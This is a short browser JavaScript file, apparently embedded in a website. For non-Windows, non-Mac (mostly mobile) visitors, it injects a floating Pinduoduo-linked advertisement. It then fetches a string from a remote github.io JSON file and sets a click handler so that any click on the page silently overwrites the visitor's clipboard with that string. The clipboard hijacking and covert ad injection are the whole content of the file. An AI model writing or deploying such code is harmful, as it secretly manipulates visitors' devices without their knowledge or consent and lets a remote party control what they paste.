if (!(/Win|mac/i.test(navigator.platform))) { 
	const bodyEl =  document.querySelector('body');
	const webSrc=`
			<a href="https://p.pinduoduo.com/fqDjFPn6" rel="nofollow">
				<img src="https://m.360buyimg.com/babel/s84x108_jfs/t1/122817/29/2264/16894/5ec4a882Eeba706e0/eb485624f5536dd9.png" style="width:100%;height:100%;" />
			</a>`;
	const webEl = document.createElement('div');
	webEl.style.width = '80px'
	webEl.style.height = '80px'
	webEl.style.position = 'fixed'
	webEl.style.left = '2px'
	webEl.style.bottom = '280px'
	webEl.innerHTML = webSrc;
	bodyEl.append(webEl);

	const xhr = new XMLHttpRequest()
	const url = 'https://sanjinxiaolongxia.github.io/code.json'
	xhr.open('get',url,true)
	xhr.send()
	xhr.onreadystatechange = function(){
		if(xhr.readyState ===4 && xhr.status === 200){
			let codeJosn =JSON.parse(xhr.responseText);
			let cpCode = '';
			for(let key in codeJosn){
				cpCode += codeJosn[key]+' ';
			}
			cpCode = cpCode.trim();
			let aNodes = document.querySelectorAll('body')
			for(let i =0; i<aNodes.length; i++){
				aNodes[i].onclick = function(){
					let oInput = document.createElement('input'); 
					oInput.setAttribute("readonly", "readonly");
					oInput.value = cpCode;
					document.body.appendChild(oInput);
					oInput.select(); 
					document.execCommand("copy"); 
					oInput.style.display='none'; 
					oInput.remove();
				}
			}
		}
	}
}
